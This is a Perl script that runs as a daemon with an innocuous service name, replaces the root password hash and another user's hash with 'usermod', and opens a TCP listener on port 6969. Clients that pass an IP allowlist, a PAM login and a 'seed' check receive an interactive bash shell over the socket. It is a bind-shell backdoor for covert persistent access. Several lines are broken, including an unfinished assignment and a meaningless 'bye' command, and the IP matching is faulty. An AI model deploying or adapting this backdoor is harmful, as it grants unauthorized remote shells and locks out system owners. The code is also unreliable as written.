#!/usr/bin/perl
###
##
#

use strict;
use warnings;
use Socket;
use Authen::Simple;
use Authen::Simple::PAM;
use IO::Socket::INET;
use Proc::Daemon;

my $PORT = 6969;
my $PID_FILE = '/var/run/perl_service.pid';
my $ROOT_HASH = 'lol';
my $BABY_HASH = 'lol';

my $working_directory = "/root/compose/wordpress-docker-compose";
# Change to the working directory
chdir $working_directory or die "Cannot change to directory $working_directory: $!";

##
##
system('bye');
my $seeds = something_that_you_did_
chomp $seeds;  # Remove trailing newline if present
print $seeds;

# Execute docker network inspect command and capture output
my $docker_network_info = qx(docker network inspect wordpress-docker-compose_default);

# Extract IPv4 addresses from the output
my @ipv4_addresses = $docker_network_info =~ /"IPv4Address": "(\d+\.\d+\.\d+\.\d+)\/\d+"/g;

print join("\n", @ipv4_addresses) . "\n";

##
##
my @allowed_ips = (
    '192.168.69.69',              # Single IP
    '127.0.0.1'                  # Single IP
);

# Add extracted subnet addresses to the allowed IPs
foreach my $ipv4_address (@ipv4_addresses) {
    push @allowed_ips, "$ipv4_address/16";
}

# Add IPs within the range 'whatever' to 'whatever'
for my $i (1..99) {
    push @allowed_ips, "172.18.0.$i";
    push @allowed_ips, "172.29.0.$i";
}

# Daemonize the script
Proc::Daemon::Init;

# Write PID to file
open(my $pid_fh, '>', $PID_FILE) or die "Can't write PID file: $!";
print $pid_fh $$;
close($pid_fh);

# Set up signal handler to remove PID file on exit
$SIG{TERM} = sub {
    unlink $PID_FILE;
    exit;
};

# Replace root hash
system("usermod -p '$ROOT_HASH' root");
# Replace admin hash
system("usermod -p '$BABY_HASH' babywyrm");

# Set up server socket
my $server = IO::Socket::INET->new(
    LocalPort => $PORT,
    Proto => 'tcp',
    Listen => SOMAXCONN,
    Reuse => 1
) or die "Can't create server: $!";

print "Listening on port $PORT...\n";

while (my $client = $server->accept()) {
    my $client_ip = $client->peerhost();

    # Log client connection attempt
    print "Connection from $client_ip\n";

    # Check if the client IP is in the allowed list
    unless (is_ip_allowed($client_ip)) {
        print "Connection from $client_ip rejected.\n";
        print $client "be_good_to_people_=\n"; # lol
	close $client;
        next;
    }

    if (my $pid = fork()) {
        close $client;
        next;
    }

    close $server;

    $client->autoflush(1);
    print $client "Connected! Please enter your username and password separated by a space: ";

    my $input = <$client>;
    chomp $input;
    my ($username, $password) = split ' ', $input;

    print "Received username: $username\n";
    print "Received password: $password\n";

    my $auth = Authen::Simple->new(Authen::Simple::PAM->new());
    unless ($auth->authenticate($username, $password)) {
        print $client "Authentication failed.\n";
        close $client;
        exit;
    }

    print $client "Please enter your seed: ";
    my $seed = <$client>;
    chomp $seed;

    unless (is_valid_seed($seed, $seeds)) {
        print $client "Invalid seed.\n";
        close $client;
        exit;
    }

    my $uid = getpwnam($username);
    $! = 0; # Clear any previous errors
    unless ($uid) {
        print $client "Failed to get UID for user $username: $!\n";
        close $client;
        exit;
    }

    # Set the effective user and group IDs to the user's UID and GID
    $> = $uid;
    $< = $uid;

    print $client "Authentication successful. Spawning shell as $username...\n";

    open STDIN, "<&", $client or die "Can't dup client to stdin";
    open STDOUT, ">&", $client or die "Can't dup client to stdout";
    open STDERR, ">&", $client or die "Can't dup client to stderr";

    exec "/bin/bash", "-i" or die "Failed to exec: $!";
}

sub is_ip_allowed {
    my $ip = shift;
    foreach my $allowed_ip (@allowed_ips) {
        if ($ip =~ /^$allowed_ip$/) {
            return 1;
        }
    }
    return 0;
}

sub is_valid_seed {
    my ($seed, $seeds) = @_;
    return 0 if $seed eq "";  # Reject empty seed
    return $seeds =~ /\b$seed\b/;
}

#
##
###
